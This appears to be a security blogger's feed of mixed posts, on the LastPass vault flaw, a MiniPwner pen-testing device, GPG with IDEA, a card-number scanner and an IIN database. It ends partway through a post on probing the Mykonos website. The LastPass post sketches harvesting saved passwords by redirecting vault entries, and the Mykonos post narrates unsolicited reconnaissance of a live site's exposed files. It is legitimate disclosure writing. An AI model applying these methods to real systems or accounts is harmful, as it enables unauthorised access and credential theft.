<p>Copyright, in its origin and intended forms provides something very simple: the right to control how a work (primarily a book) is copied. That&#8217;s it, that simple.</p>

<p>So from a historical perspective, a copyright violation was to create a copy of book without the authors permission - theft would have been to take a book that the author printed, permanently depriving him of that asset. These are clearly not the same thing - despite the assertions of certain powerful groups.</p>

<p>I&#8217;m not defending or down playing piracy, but let&#8217;s talk about it in the proper context - it&#8217;s a property rights issue, not theft.</p>

      <title>Slipping Past LastPass</title>
      <description><p><strong>Update:</strong> LastPass has confirmed that they&#8217;ll address this issue in the next release.</p>

<p><strong>Update 2:</strong> LastPass has addressed this issue in their new v2.0 release. There is still a way to bypass the password prompt in Chrome, but they will address that in the next release. Overall, it looks like we can close the books on this one.</p>

<p>I&#8217;m a big fan of <a href="https://lastpass.com/">LastPass</a> - it&#8217;s a great service that has impressed me every step of the way. Though it&#8217;s not perfect, and I&#8217;ve found a small hole that makes it easier for an attacker to get your passwords - if the following are true:</p>

<ol>
<li>The attacker has physical access to your PC.</li>
<li>You&#8217;ve made the mistake of not locking your PC when you walk away.</li>
<li>You&#8217;ve select the option to stay logged on - which happens to be a default, or, you&#8217;ve left your browser open (as I expect most people do).</li>
</ol>


<p><img class="center" src="http://adamcaudill.com/files/lastpass_default_opt.png"></p>

<p>If all three of these are true (or your PC is otherwise compromised) - you probably shouldn&#8217;t expect much in the way of security, but LastPass does protect you - most of the time. If you try to copy or view a password, you&#8217;ll be prompted to enter your Master Password - but there&#8217;s one case that can easily expose your passwords without needing to know the Master Password.</p>

<p>The issue is that LastPass allows you to change the address associated with a login without confirming your master password. This would allow an attacker to update an entry in your vault to a specially crafted page to echo the password - allowing the attacker to see the password and leave minimal tracks behind. I setup a <a href="http://adamcaudill.com/files/EchoLoginForm.html">special page</a> to test this, it echoes the password as soon as LastPass enters it, allowing me to see the password in a few seconds without providing the master password (it&#8217;s also possible to update the password without providing the Master Password, providing another opportunity for mischief).</p>

<p><img class="center" src="http://adamcaudill.com/files/lastpass_edit.png"></p>

<p><strong>Automation</strong></p>

<p>While I&#8217;ve not taken the time to build a tool to automate this - it would be a fairly simple process to do, just a matter of investing the time (which unfortunately I don&#8217;t have). The obvious solution would be to automate the GUI interaction to perform the following steps:</p>

<ul>
<li>Change the URL to a malicious page.</li>
<li>Navigate to the page, and log the login data.</li>
<li>Revert the URL to the original value.</li>
</ul>


<p>Using this method it would be possible to collect all of a users credentials within just a few minutes. It&#8217;s possible there may be a simpler &amp; faster route available by interacting directly with the plug-ins, though in looking at the exports and COM interfaces I didn&#8217;t see an obvious way to achieve this (which as a LastPass user, this makes me happy).</p>

<p>For an attacker, one substantial upside is that there would be little evidence of the event - while the LastPass Vault will show that all entries have been &#8220;touched&#8221; recently, I would venture to say that very few users would actually notice.</p>

<p>While this attack requires full access as the logged-in user, if a PC is otherwise compromised (perhaps as part of an APT type attack), it could allow an attacker to greatly expand their activities with a minimal time investment. This is the type of situation that could take a fairly small local information disclosure and turn it into a real nightmare scenario for a targeted user.</p>

<p><strong>Solution</strong></p>

<p>The simplest solution for this issue is to require Master Password verification if the URL changes, or at least require it if the domain changes. This should be a minor change for them and will eliminate this attack vector. Thankfully this is a minor issue, due to the three requirements required to pull this off - so I don&#8217;t believe there is too much risk due to this oversight.</p>

      <title>MiniPwner</title>
      <description><p>I recently finished building my first <a href="http://minipwner.com/">MiniPwner</a> - a tiny <a href="https://openwrt.org/">OpenWrt</a>-based system for pen-testing. At only 2.25 x 2.25 inches, the device plus battery is still extremely small - it easily fits in a pocket, and could be hidden anywhere.</p>

<p>The device is based on the <a href="http://wiki.openwrt.org/toh/tp-link/tl-wr703n">TP-LINK TL-WR703N</a>, which uses a 400Mhz Atheros AR7240 CPU - not exactly a power-house, but enough power for standard pen-testing (or even just as a super-portable linux box). In cases where the 400Mhz CPU and 32MB RAM aren&#8217;t enough, you can easily use OpenVPN as a tunnel to run your tests remotely.</p>

<p>The total investment for the build was only $38 - though next time I&#8217;ll pay a little extra and get the <a href="http://www.amazon.com/gp/product/B005FYNSZA/ref=as_li_ss_tl?ie=UTF8&amp;tag=adamcaucom-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B005FYNSZA">16GB drive</a> - mostly for extra room when working with logs. The 4GB drive used in the standard build has plenty of room for the software - but I&#8217;d rather have the extra room to work with.</p>

<p>The build process was process was simple - thankfully the <a href="http://minipwner.com/index.php/minipwner-build">instructions</a> are quite good, though I did have to change a few things to make it all work.</p>

<p>Step 1): To save looking, <a href="http://downloads.openwrt.org/snapshots/trunk/ar71xx/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin">here&#8217;s</a> a direct link to the OpenWrt image.</p>

<p>Step 4): I formated the thumb drive by mounting it in a Ubuntu VM, and used <a href="http://gparted.sourceforge.net/">GParted</a> to delete the existing partition, and created a 512MB swap partition, then the rest is ext4.</p>

<p>Step 16): Read step 17 first so you don&#8217;t feel so stupid for wasting time trying to figure out why step 16 doesn&#8217;t seem to do anything.</p>

<p>Step 21): I use WPA2 on my network, so I had to edit the <code>/etc/config/wireless</code> a little differently:</p>

<pre><code>config wifi-iface
        option device   wlan0
        option network  wan
        option mode     sta
        option ssid     &lt;ssid&gt;
        option encryption psk2+tkip
        option key &lt;password&gt;
</code></pre>

<p>More information about the wireless setup can be found <a href="http://wiki.openwrt.org/doc/uci/wireless">here</a>.</p>

<p>Step 24): My local wireless network is in the 192.168.1.x range, so this wasn&#8217;t working for me. Seeing as changing the wireless doesn&#8217;t make sense for me (way too many static devices), I had to change the IP address of <code>eth0</code> to deal with the issue. I updated my <code>/etc/config/network</code> to look something like this:</p>

<pre><code>config 'interface' 'lan'
        option 'ifname' 'eth0'
        option 'type' 'bridge'
        option 'proto' 'static'
        option 'ipaddr' '192.168.2.1'
        option 'netmask' '255.255.255.0'
</code></pre>

<p>Once the change is made, you&#8217;ll need to execute <code>/etc/init.d/network restart</code> - then update your PC&#8217;s static IP address to &#8220;192.168.2.111&#8221; and reconnect your telnet session.</p>

<p>Step 27): When executing the installs I was receiving this error:</p>

<pre><code>opkg_install_cmd: Cannot install package &lt;package-name&gt;
</code></pre>

<p>To correct this error, I had to run <code>opkg update</code> - after this the installs started working fine.</p>

<p>Step 27b): The install for <code>samba2-client</code> was failing, as there isn&#8217;t a package by that name - though <code>samba36-client</code> installed fine.</p>

<p>Overall, it&#8217;s a great little setup - I&#8217;m quite pleased.</p>

      <title>Gpg4win &amp; IDEA</title>
      <description><p>Huge PGP files, an ancient version of PGP, and errors every time they tried to decrypt a file - that was my completely unexpected challenge on Friday. Dealing with file processing issues really isn&#8217;t part of my job description, but I&#8217;m the closest thing my company has to an expert when it comes to encryption, so the task fell to me.</p>

<p>After looking at the options and issues to get the server upgraded to a non-stone-age version of the PGP software, the easiest answer looked like decrypting the files with GPG - it wasn&#8217;t as easy as expected, but I did get some useful information that may help others.</p>

<h3>IDEA</h3>

<p>If it wasn&#8217;t for <a href="http://en.wikipedia.org/wiki/International_Data_Encryption_Algorithm">IDEA</a> this would have been easy, but the keys used for this transfer were old (thankfully the data isn&#8217;t sensitive) and IDEA it was. GPG <a href="http://www.gnupg.org/faq/why-not-idea.en.html">doesn&#8217;t support IDEA</a> due to various patents (most if not all of which are now expired), so that leaves us to use a rather old plug-in to fill in the gap. Unfortunately for me, the server that hosts up that plug-in is misconfigured, making it impossible to retrieve the file.</p>

<p>Thankfully there are <a href="http://www.spywarewarrior.com/uiuc/gpg-idea/gpg-idea.htm">other sources</a> (<a href="http://www.spywarewarrior.com/uiuc/gpg-idea/ideadll.zip">plug-in</a>, <a href="http://adamcaudill.com/files/ideadll.zip">mirror</a>).</p>

<h3>Gpg4win</h3>

<p>I used <a href="http://www.gpg4win.org/">Gpg4win</a> so I could decrypt the files from Windows - which had unexpected consequences. The current version of Gpg4win uses gpg version 2.0, which isn&#8217;t compatible with the IDEA plug-in - a fact that isn&#8217;t pointed out anywhere.</p>

<p>The key to making this work was to use an older version of Gpg4win - I used <a href="http://files.gpg4win.org/gpg4win-1.1.4.exe">v1.1.4</a>, which thankfully is compatible with the plug-in. Though I do wish I found this out a few hours sooner than I did.</p>

<h3>Setup</h3>

<p>The setup for this is pretty simple, it&#8217;s documented in a few places, but here is a quick wrap-up:</p>

<ol>
<li>Install <a href="http://files.gpg4win.org/gpg4win-1.1.4.exe">Gpg4win v1.1.4</a></li>
<li>Download the <a href="http://www.spywarewarrior.com/uiuc/gpg-idea/ideadll.zip">plug-in</a>, and copy to <code>C:\Program Files (x86)\GNU\GnuPG\lib</code></li>
<li><p>Update (or create if it’s not there) the <code>C:\Users\&lt;user&gt;\AppData\Roaming\gnupg\gpg.conf</code> file to include the following:</p>

<p> <code>load-extension "C:\Program Files (x86)\GNU\GnuPG\lib\idea.dll"</code></p></li>
</ol>


<p>Once this is done, you can run <code>gpg --version</code> which will give you information about what algorithms are supported. It should look like this:</p>

<pre><code>&gt;gpg --version
gpg (GnuPG) 1.4.9 (Gpg4win 1.1.4)
Copyright (C) 2008 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: C:/Users/Adam/AppData/Roaming/gnupg
Supported algorithms:
Pubkey: RSA, RSA-E, RSA-S, ELG-E, DSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH
Hash: MD5, SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2
</code></pre>

<p>If you note the first item on the &#8220;Cipher&#8221; line is IDEA, that means it worked. If you don&#8217;t see that - something went wrong, probably a bad path.</p>

<p>This version is able to handle the large files that old versions of PGP can&#8217;t, and it allowed for a quick solution to the problem until we can upgrade the server.</p>

      <title>Detecting .NET 4.0 Remotely</title>
      <description><p>While preparing to deploy an internal application I started to wonder if all of the workstations were properly configured - after a quick search I found a number of methods for detecting the .NET framework locally, but I didn&#8217;t find any clean options that worked remotely.</p>

<p>Thankfully I found a post with a few <a href="http://skatterbrainz.blogspot.com/2011/05/assorted-ways-to-detect-net-40.html">detection methods</a>, one of which was using <a href="https://en.wikipedia.org/wiki/Windows_Management_Instrumentation">WMI</a> from VBScript - which gave me the inspiration I needed:</p>

<p>I pulled up <a href="http://www.linqpad.net/">LINQPad</a> and whipped up a quick script to check for both the Client Profile and full (extended) version on a list of computers. Hopefully it&#8217;ll be of some use others.</p>

<p>One thing to note, is that you do need Administrator permissions on the remote workstations.</p>

      <title>A month with DuckDuckGo</title>
      <description><p>It wasn&#8217;t long after Google went live that they became my search engine of choice - with the only other (somewhat) viable option being Yahoo, it was an easy choice. In the years since then, I&#8217;ve not questioned that choice, but now that Google is focusing on killing features and building little-used social features, the time seemed right to see if there are better options.</p>

<p>So a month ago I began an experiment, I committed to using <a href="https://duckduckgo.com/">DuckDuckGo</a> for a month - here&#8217;s what I&#8217;ve found.</p>

<p><em>Quality:</em> The quality of the results is at par with Google for the vast majority of queries. On some queries where there are few results, Google tends to rank the results more accurately.</p>

<p><em>Index Size:</em> The Google index seems to be larger, with faster additions than DuckDuckGo, though this was only a real issue for very obscure search terms. For the majority of queries, this isn&#8217;t noticeable.</p>

<p><em>Bang Syntax:</em> DuckDuckGo has a great feature called &#8217;<a href="https://duckduckgo.com/bang.html">!bang</a>&#8217; which allows you to search specific sites easily. Of all the options here are the ones I used most often:</p>

<ul>
<li>!amazon - Search Amazon.com</li>
<li>!g - Google Search</li>
<li>!man Search the *nix man pages</li>
</ul>


<p>The bang syntax works great with the Search/Address bar in Chrome, making this my favorite feature.</p>

<p><em>Speed:</em> DuckDuckGo feels much faster that Google does now (which is sad, as Google used to be amazingly fast, even on extremely slow connections), and the results page is clean and free of useless distractions.</p>

<p><em>Image Search:</em> One that DuckDuckGo is missing compared to Google is a useful image search feature. Though you can easily jump to Google&#8217;s image search by adding &#8220;!i&#8221; to your query.</p>

<p><em>Zero Click Info:</em> For a number of searches, DuckDuckGo displays an answer from an authoritative source, often giving you what you need to know without having to go any further. For me, the most useful of these is data from StackOverflow and Wikipedia.</p>

<p><em>Auto-Complete / Suggestions:</em> This is the single biggest thing I&#8217;ve missed, it seems like a minor feature but I didn&#8217;t realize how useful it was until is wasn&#8217;t available. Hopefully they&#8217;ll add this at some point, would be a real step in the right direction.</p>

<p><strong>Overall:</strong> I&#8217;m impressed. It&#8217;s not perfect, but it&#8217;s far more competitive than I expected. It&#8217;s clean, lean, and <a href="http://donttrack.us/">private</a>. Over the last month I&#8217;ve still used other Google services and products (Chrome, Gmail, Google Voice, Google Authenticator, etc.) so it wasn&#8217;t a complete separation from Google - but enough to remind me that innovation is still happening elsewhere.</p>

<p>As Google has shifted much of its energy from information to social, companies like DuckDuckGo are continuing to innovate and find better ways to provide the information that we live on.</p>

      <title>Absolute Deniability</title>
      <description><p><a href="http://sebsauvage.net/wiki/doku.php?id=php:zerobin">ZeroBin</a> (<a href="https://github.com/sebsauvage/ZeroBin">code</a>) is a new and interesting piece of software to compete with services such PasteBin - largely in response to PasteBin&#8217;s new aggressiveness in <a href="http://www.bbc.co.uk/news/technology-17544311">removing objectionable posts</a>. For PasteBin, it&#8217;s easy to see why their policy changed - currently they can&#8217;t deny knowledge of what they are hosting, it&#8217;s plain-text and easily scanned (look <a href="http://www.leakedin.com/">at this</a> if you don&#8217;t believe me). ZeroBin on the other hand has taken a very different approach - to not just have <a href="https://en.wikipedia.org/wiki/Plausible_deniability">plausible deniability</a>, but absolute deniability.</p>

<p>The key to this is that ZeroBin stores pastes and discussions encrypted - and the encryption is performed in the browser, with a browser generated key. This means that the people running the ZeroBin software have no knowledge of what they are storing.</p>

<p>So, if they are asked to remove content, all they can do is remove specific named items - it would be impossible to remove all items that contain specific material (where if PasteBin was to be ordered to remove all items containing credit card numbers, it&#8217;s a realistic possibility). As long as knowledge of the key remains limited - the paste will likely live on, no matter the content.</p>

<p>To make it even better, there are no accounts - so there&#8217;s no way to see what a specific user is posting. With a properly configured server, this could be completely anonymous. With no knowledge of the content, no knowledge of users - it&#8217;s the ultimate in deniability.</p>

<p>I really expect that this technique will become far more common in the future. It allows a much higher level of deniability for hosts and service provider, and greatly restricts the ability of investigators to research the activities of a user or group.</p>

<p>Take a closer look at this, I expect you&#8217;ll see more of this.</p>

      <title>HP Folio 13</title>
      <description><p>When Intel and various industry partners started talking about &#8220;ultra-books&#8221; as competition against Apple and tablets, I was more than a little skeptical. Ultra-books are small and light weight - but not cheap (average price being around $1,000) and rather underpowered compared to what you can get for the same money with a more traditional laptop (they are basically MacBook Air knock-offs). I had written them off almost as soon as they were announced.</p>

<p>I really expected the ultra-book to be a fad, and a short-lived one at that.</p>

<p>Then came the <a href="http://www.amazon.com/gp/product/B006OEL86Q/ref=as_li_ss_tl?ie=UTF8&amp;tag=adamcaucom-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B006OEL86Q">HP Folio 13</a> - my desktop recently failed, and since then I&#8217;ve been using my 2+ year old ASUS G73 as my only machine. While the G73 is great - it&#8217;s also massive, hot, and heavy. After parting with my unused camera gear, I acquired a Folio 13 to act as my main laptop, leaving the G73 to play the role of desktop / development machine.</p>

<p>Within a couple hours of getting the Folio 13 it was clear, I was in love.</p>

<p>It&#8217;s not quite the love I felt when I <a href="http://adamcaudill.com/2011/01/02/thoughts-on-the-ipad-from-an-apple-hater/">first found the iPad</a>, but it&#8217;s an amazing machine. Fast, super-light, and the battery goes on forever - it&#8217;s the ideal laptop. With the power of my G73 available anytime via RDP, I think this combination is about as good as it gets.</p>

<p>Here&#8217;s a rough overview of the Folio:</p>

<ul>
<li>Intel Core i3 / i5**</li>
<li>128GB SSD</li>
<li>4GB RAM</li>
<li>13.3&#8221; 1366x768 display</li>
<li>9 hour battery (so far 7-8 hours seems to be the realistic number)</li>
<li>Brushed aluminum case</li>
<li>3.3lbs</li>
</ul>


<p>Also included are the normal things you would expect, like a web cam, Bluetooth, etc..</p>

<p>I&#8217;ve been extremely impressed with what this little thing can do, from large compiles to generating <a href="https://github.com/mojombo/jekyll">Jekyll</a> sites, it&#8217;s more capable than I expected. So far it&#8217;s handled everything I&#8217;ve thrown at it - and most taking around the same time as my G73 would (and some taking less, thanks to the Folio&#8217;s SSD).</p>

<p>I&#8217;ll be doing most of my writing and non-development work on the Folio, and the G73 will still be my go-to system anytime I need Visual Studio or other heavy-weight development tools (though I&#8217;d be willing to bet, it&#8217;ll be via RDP from the Folio more often than not).</p>

<p>Overall: I&#8217;m extremely pleased. It&#8217;s a great device - it has the battery life and portability of a tablet (i.e. an iPad), with the power and flexibility of a traditional laptop.</p>

<p>** The Core i3 version is less expense, and thanks to the lower power consumption, it also stretches the battery life better than the i5 - making it a win-win.</p>

      <title>Moving to Octopress</title>
      <description><p>As you might be able to tell from looking, something is different around here.  So what&#8217;s changed?</p>

<p><strong>Octopress</strong></p>

<p>I&#8217;ve switched from WordPress to <a href="http://octopress.org/">Octopress</a>, a <a href="https://github.com/mojombo/jekyll">Jekyll</a>-based blogging platform that generates a completely static site. So there&#8217;s no database, no dynamic code (i.e. PHP), minimal memory footprint (which is great, given my <a href="http://adamcaudill.com/2012/04/05/quickpacket-hosting/">recent hosting change</a>) and best of all - it&#8217;s fast and secure. Using Octopress, it greatly reduces the security surface of the server, which means I spend less time worrying about updates and more time writing.</p>

<p>Thanks to the completely static nature of the platform, it&#8217;s extremely fast - it allows the server software to do what it does best: shove bits down the wire, instead of waiting on a database and parsing and executing dynamic code. In the coming days I&#8217;ll be tweaking the server software to optimize for performance, so it should get even faster.</p>

<p>I&#8217;m still trying to figure out the ideal workflow, but so far I think it&#8217;s the right platform for me. Hopefully, I&#8217;ll be able to keep the friction low and spend more time writing.</p>

<p><strong>WordPress</strong></p>

<p>So what about WordPress? I still love the product - in general. It&#8217;s not perfect, and while it&#8217;s easy to get running, it takes effort to make it fast and secure - something most people don&#8217;t do. If you want a full CMS and you&#8217;re willing to do it right, WordPress is a great option.</p>

<p>Personally, there are some frustrations with WordPress that I&#8217;m happy to be rid of - not the least of which is fighting the WordPress editor to maintain code formatting. It&#8217;s little things like this, that has had me looking for better options.</p>

<p>For your average non-developer, something like Octopress has too much friction - as the tag line says, it&#8217;s for hackers. If you aren&#8217;t comfortable with Ruby development, this probably isn&#8217;t the solution for you. If you are, and you want a lightning fast, flexible, and powerful platform - it&#8217;s a great option.</p>

<p><strong>Comments</strong></p>

<p>You may have noticed that there isn&#8217;t a comment form - I&#8217;ve went back to not having comments.</p>

<p>While I do greatly appreciate those that have taken the time to leave a comment, comments make up the vast minority of feedback I receive. Twitter, and Facebook are more common - so instead of slowing the site down and wasting my time fighting spam, I&#8217;ll just turn off the comments.</p>

<p>If you have feedback - question, suggestions, anything else - <a href="http://twitter.com/adamcaudill">find me on twitter</a> for the quickest response.</p>

      <title>QuickPacket Hosting</title>
      <description><p>Continuing my long tradition of frequent host changes, this site has been moved to yet another host. In the last few years I&#8217;ve used a <a href="http://adamcaudill.com/2009/06/13/switching-hosts-again/">number of hosts</a> (and there&#8217;s a couple more not on that list), and this time I&#8217;m taking a bit of a risk - so it&#8217;ll be interesting to see how this one works out. I&#8217;ve switched to a company called <a href="https://www.quickpacket.com/">QuickPacket</a>, but this time instead of a fairly beefy VPS, I&#8217;ve went in the opposite direction - absolute minimum.</p>

<p>The new plan is about as minimal as it gets:</p>

<ul>
<li><p>128 MB RAM</p></li>
<li><p>256 MB vSwap</p></li>
<li><p>1 CPU Cores</p></li>
<li><p>20 GB Disk Space</p></li>
<li><p>500 GB Bandwidth</p></li>
</ul>


<p>The upside to this? It&#8217;s only <a href="http://www.lowendbox.com/blog/quickpacket-4-99m-128mb-xen-in-atlanta-ga-san-jose-ca-openvz-also-available/">$15 per year</a>.</p>

<p>So I&#8217;m going to focus on caching and optimization to keep this and a few other sites running on such lean resources. In theory WordPress should be able to do it, if it can&#8217;t - I&#8217;ll switch to <a href="http://octopress.org/">Octopress</a> or something similar.</p>

<p>This should be a fun challenge.</p>

      <title>My 5 minutes of infamy</title>
      <description><p>October 28, 2004 is a day I&#8217;ll remember for the rest of my life.</p>

<p>I was coding away on the next version of a small product called GSuite that I was building for a tiny (and now nonexistent) software company called Imspire Software. It was a simple tool that provided some goodies for Gmail users, and had a few thousand users (it eventually died as a result of rapid API changes and new tools directly from Google). As I took a break to check my email, I saw something that shocked me:</p>

<p>[The full email is still <a href="http://osvdb.org/ref/11/11176-gsuite.txt">posted</a> over at osvdb, and I make a point to go and look at it and the <a href="http://osvdb.org/show/osvdb/11176">details</a> once a year or so - just to remind myself of what can happen.]</p>

<p>As I worked through the somewhat iffy English of the email I was in shock. I instantly understood the issue, I could see the code in my mind. It was written by another developer, and I could remember questioning its security - but I had other things I was supposed to be doing and didn&#8217;t worry about it. What a mistake that was.</p>

<p>I went back to Visual Studio and found the code that caused it all:</p>

<p>Shifting values is obfuscation and little more, it looks like security - it might even smell like security, but it isn&#8217;t. It&#8217;s a false sense of safety, it was a mistake to implement and even more of a mistake to actually use in a consumer product.</p>

<p>While this is only a local information disclosure, and not something far more serious like a remote arbitrary code execution issue - it was still enough to really shake me. I had always considered myself to be a good developer, and part of that is writing secure code. This was many things - but secure isn&#8217;t one of them.</p>

<p>Thankfully, <a href="http://lostmon.blogspot.com/">Lostmon</a>, the finder of the issue was courteous enough to give me a couple of days advance notice before making it public. Allowing me plenty of time to get a notice up on the web site, and get the next (fixed) version ready for release. I switched from a glorified <a href="http://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a>, to <a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Rijndael</a> - a significant step up I would say.</p>

<p>Was anybody harmed by this issue? I don&#8217;t believe so - it was a relativity minor issue given what was needed to get the password. Was anybody impacted? Most certainly.</p>

<ul>
<li>Users: They now wonder if they are secure - did somebody steal their information?</li>
<li>Company: The brand is weakened, less trusted, and questioned more.</li>
<li>Developers: Confidence is lost, self doubts start creeping in.</li>
</ul>


<p>Because of this, every time I release an application I give much more thought to what I&#8217;m exposing and how it could be leveraged in an attack against my users. The only way I&#8217;ll agree to an application release is if I&#8217;m completely certain that I&#8217;m not risking a user&#8217;s security - if there are any unknowns, any doubts, then it&#8217;s not worth the risk. Just that simple.</p>

      <title>CCSRCH v1.0.7</title>
      <description><p>I&#8217;ve released a new version of <a href="https://github.com/adamcaudill/ccsrch">CCSRCH</a>, the open-source PAN (a.k.a credit card number) search tool to help companies maintain PCI compliance. This is a fairly minor release, primarily focusing on reducing false positives. The scanner has been updated to exclude the following:</p>

<ul>
<li><p>Results made up of the same two digits repeating (i.e. 5454545454545454).</p></li>
<li><p>Results that have seven or more of the same digits repeating (i.e. 5555555555554444).</p></li>
</ul>


<p>I also fixed a bug that I introduced in v1.0.6 that prevented it from compiling on certain *nix systems; while I was in there I also fixed several instances of this building warning on newer Linux distros:</p>

<pre><code>warning: call to __builtin___strncat_chk might overflow destination buffer
 [enabled by default]
</code></pre>

<p>I also took the time to write-up really simple build instructions for *nix users:</p>

<pre><code>$ wget -O ccsrch.tar.gz https://github.com/adamcaudill/ccsrch/tarball/master
$ tar -xvzf ccsrch.tar.gz
$ cd adamcaudill-ccsrch-&lt;rev&gt;/
$ make all
</code></pre>

<p>This will probably be the last release for now unless a bug turns up; to improve results further I&#8217;m working on a new project (<a href="https://github.com/adamcaudill/ccsrch-score">ccsrch-score</a>), hopefully it&#8217;ll be released soon.</p>

      <title>IIN (BIN) Database</title>
      <description><p>An <a href="http://en.wikipedia.org/wiki/ISO/IEC_7812">Issuer Identification Number</a> (IIN, more commonly called a BIN) is the first 6 digits of a credit or debit card, and it identifies the bank that issued it - and if you want to know if a number is a real credit card or just a bunch or random digits, it&#8217;s a huge help. While credit card numbers do use the <a href="http://en.wikipedia.org/wiki/Luhn_algorithm">Luhn algorithm</a> (mod 10 check) to see if the number is valid, it still produces a huge false-positive rate.</p>

<p>For an application like <a href="https://github.com/adamcaudill/ccsrch">ccsrch</a>, having this data available would be very handy to reduce false positives when scanning a large file system (scanning a large server produces a huge number of possible hits), but for what I would call fairly misguided reasons, the official registrar of these numbers (the <a href="http://www.aba.com/default.htm">ABA</a>) doesn&#8217;t make this data publicly available. As a result many people have pulled together what data they could find and made it freely available.</p>

<p>So I&#8217;ll add my name to that list.</p>

<p>I&#8217;ve pulled data from many public sources (sorry, I didn&#8217;t keep very good notes as to the sources) and cleaned it up to a reasonable point. All told, I&#8217;ve probably spent 40 hours or more cleaning this data up and getting it to a usable state. It contains over 60,000 entries, including major credit cards (Visa, MasterCard, Amex, Discover) as well as a few merchant entries.</p>

<p>Each record contains the following:</p>

<ul>
<li><p>IIN</p></li>
<li><p>Type (Mastercard, Visa, Visa Credit, etc.)</p></li>
<li><p>Name (Issuer name)</p></li>
<li><p>Length</p></li>
</ul>


<p><strong>Data Quality</strong></p>

<p>It&#8217;s not perfect. It&#8217;s from public sources so there may be errors, and there are some duplicates from cases where I wasn&#8217;t able to determine who the IIN actually belongs to. I&#8217;ve also updated for name changes and mergers where possible, but I&#8217;m sure I&#8217;ve missed a few and there are some where the assets where split, so I don&#8217;t know who the correct owner actually is (Washing Mutual being the leading example of this).</p>

<p>In general, I leaned to the side of caution - so if I didn&#8217;t know for sure, I left the duplicate in.</p>

<p>If you need absolutely correct data - contact the ABA, they are the only source that can give you the completely accurate listing. If you need to have a decent idea if a number is valid for most cases - I would say that this data is good enough.</p>

<p><strong>Warranty</strong></p>

<p>Just to make it really, really, really clear: There is no guarantee that this data is accurate, that it won&#8217;t cause to lose your job, cause your house to burn down, or cause Rebecca Black&#8217;s <a href="http://www.youtube.com/watch?v=kfVsfOSbJY0">Friday</a> to get stuck in your head (yup, you&#8217;re welcome ;)).</p>

      <title>Poking Mykonos</title>
      <description><p>While checking on the latest updates in the start-up world from TechCrunch, I came across <a href="http://techcrunch.com/2012/01/23/mykonos-helps-companies-battle-hackers-raises-4-million/">their article</a> on <a href="http://www.mykonossoftware.com/">Mykonos</a>; the important part of their article (at least for me), is this:</p>

<p><em>Mykonos’s Web Security product uses deception to “detect, confuse, slow down and prevent attackers” in real-time in order to help companies protect their websites and Web apps from malicious hacker and proactively prevent fraud and theft.</em></p>

<p>A couple of minutes of reading, and my interest was piqued - to say the least. The thing that most interested me was the claim of no false positives, while they do <a href="http://www.mykonossoftware.com/early-detection.php">talk about it</a> - I really wanted to see it for myself. Assuming they used their own product to protect their site, I took a few minutes to see what I could find - and find I did.</p>

<p>The first thing I did was a view-source to see what I could learn about their site - mainly to see if there were any obvious signs of using one CMS or another. The first thing that jumps out at me is this from the HTML:</p>

<pre><code>&lt;!-- InstanceBegin template="/Templates/mykonos.dwt.php"
     codeOutsideHTMLIsLocked="false" --&gt;
</code></pre>

<p>So, this tells us they are using Dreamweaver, and the name of the template. So, the next question is, does that <a href="http://www.mykonossoftware.com/Templates/"><code>/Templates/</code></a> directory exist on the server?</p>

<p><img src="http://adamcaudill.com/files/2012-01-23_1930.png" alt="File Listing" /></p>

<p>Yup.</p>

<p>So, not only does it exist, they have directory listings turned on - which to me was a real shock. Unfortunately for us though, these files are named with the <code>.php</code> extension and not the <code>.dwt</code> I was hoping for, so we can&#8217;t get much useful from them.</p>

<p>So, from looking at the source of the home page, we can see that the css files are stored in a <a href="http://www.mykonossoftware.com/css/">/css/</a> directory - maybe that&#8217;ll be interesting.</p>

<p><img src="http://adamcaudill.com/files/2012-01-23_1935.png" alt="File Listing" /></p>

<p>It&#8217;s there, and like last time, we can see all of the files. While CSS files are of no real interest, the <a href="http://www.mykonossoftware.com/css/_notes/">/_notes/</a> directory is, because it&#8217;ll contain a file called <code>dwsync.xml</code> - which can be quite interesting (since we knew they are using Dreamweaver, it&#8217;s not too surprising to see this). This file contains data about the last time the site was pushed from Dreamweaver, and will contain one entry per file, and looks like this:</p>

<pre><code>&lt;file name="style.css"
 server="ftp.belincreative.com/public_html/clients/mykonos/site/"
 local="129651858311162109"
 remote="129651936600000000"/&gt;
</code></pre>

<p>The most interesting thing there is the <code>server</code> entry, as it tells us a little about the file-system; which if we were really trying to attack the site, knowing that would be handy. The other thing of interest is that when you see one <code>/_notes/</code> directory, you&#8217;ll see lots more, as Dreamweaver likes to put them everywhere.</p>

<p>So, let&#8217;s see if there&#8217;s one in the root - that should be the most interesting one. Sure enough: <a href="http://www.mykonossoftware.com/_notes/">/_notes/</a></p>

<p><img src="http://adamcaudill.com/files/2012-01-23_1949.png" alt="" /></p>

<p>This one has a few interesting entries, such as a <a href="http://www.mykonossoftware.com/TechSpecsWhatsNew.html">PHP file</a> that is named with an HTML extension - causing the code not to execute. Viewing the source of that file in the browser exposes the <a href="http://www.mykonossoftware.com/inc/">/inc/</a> directory; potentially interesting, but yields little information. The next file I tried (knowing it would be way too easy if it worked), was the <a href="http://www.mykonossoftware.com/.htaccess">.htaccess</a> file:</p>

<pre><code>&lt;files "webadmin.pl"&gt;
    AuthUserFile /usr/local/www/public_html/.htpasswd
    AuthType Basic
    AuthName "Server Administration"
    require valid-user
&lt;/files&gt;
</code></pre>

<p>Now, at first glance things look too good to be true - and that&#8217;s because they are. Look at the path in <code>AuthUserFile</code> and compare that to the entries from the <code>dwsync.xml</code> files. This <code>.htaccess</code> file is part of the trap, which is all but confirmed if you try to go to the <a href="http://www.mykonossoftware.com/.htpasswd">.htpasswd</a> file which shouldn&#8217;t work, since the path isn&#8217;t what we would expect.</p>

<p>Now, while mucking around looking at the aforementioned files, and others such as <a href="http://www.mykonossoftware.com/robots.txt">robots.txt</a>, I would periodically see this, which I would assume is part of that &#8220;no false positive&#8221; promise:</p>

